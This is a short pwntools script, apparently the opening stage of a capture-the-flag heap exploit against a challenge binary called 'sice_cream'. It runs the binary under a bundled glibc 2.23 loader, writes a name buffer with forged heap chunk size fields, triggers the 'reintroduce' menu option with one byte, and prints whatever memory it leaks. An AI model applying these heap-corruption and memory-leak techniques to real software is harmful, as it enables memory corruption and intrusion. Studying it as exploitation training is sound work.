import sys, time
from pwn import *
context.log_level = 'error'
p = process(['./ld-2.23.so', '--library-path', '.', './sice_cream'], stderr=process.STDOUT)

buf = bytearray(b'A' * 0x100)
buf[0x18:0x20] = p64(0x91)
buf[0xa8:0xb0] = p64(0x21)
buf[0xc8:0xd0] = p64(0x21)
buf[0xf8:0x100] = p64(0x60)
p.recvuntil(b'Whats your name?')
p.recvuntil(b'> ')
p.send(bytes(buf))
# menu -> choix 3 (reintroduce) avec 1 octet
p.recvuntil(b'> ')
p.send(b'3\n')
p.recvuntil(b'> ')
p.send(b'Z')
time.sleep(0.5)
out = p.recvrepeat(0.8)
print("LEAK:", out)
print("hex:", out.hex())
p.close()
